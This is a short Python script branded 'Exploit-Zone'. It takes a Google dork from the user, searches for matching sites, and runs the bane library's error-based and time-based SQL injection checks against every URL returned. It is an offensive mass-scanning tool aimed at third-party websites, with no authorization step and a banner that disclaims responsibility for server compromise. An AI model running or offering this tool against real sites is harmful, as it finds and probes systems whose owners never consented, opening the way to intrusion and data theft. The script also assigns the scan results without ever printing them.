import sys
import bane
import requests
from googlesearch import search
import time
import os

os.system("clear")


print("___________              .__         .__  __            __________                    ")
print("\_   _____/__  _________ |  |   ____ |__|/  |_          \____    /____   ____   ____  ")
print(" |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\  ______   /     //  _ \ /    \_/ __ \ ")
print(" |        \>    < |  |_> >  |_(  <_> )  ||  |   /_____/  /     /(  <_> )   |  \  ___/ ")
print("/_______  /__/\_ \|   __/|____/\____/|__||__|           /_______ \____/|___|  /\___  >")
print("        \/      \/|__|                                          \/          \/     \/ ")

print("""
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 #				User It Responsibly				    #
 #				Made By Antoine Zayat				    #
 #                              Github: hacker900123				    #
 #    		I Hold No Responsibility For Any Server Comprimization Done	    #
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
""")



dork = raw_input("Enter Dork To Search: ")
amount = raw_input("Enter Maximum Amount To Query: ")

try:
	for url in search(dork, stop=int(amount)):
		u = url.split()
		for i in u:
			print("="*40)
			print("[*] Possible Vulnerable Url")
			time.sleep(1)
			print(i)
			print("="*40)
			print("[*] Checking Url For Sqli Vulnerability")
			time.sleep(1)
			error_Based = bane.sqlieb(i)
			time_Based = bane.sqlitb(i)
			print("+-"*40)
except Exception as e:
	print("The Script has encountered an error")
	print(e)
	sys.exit()
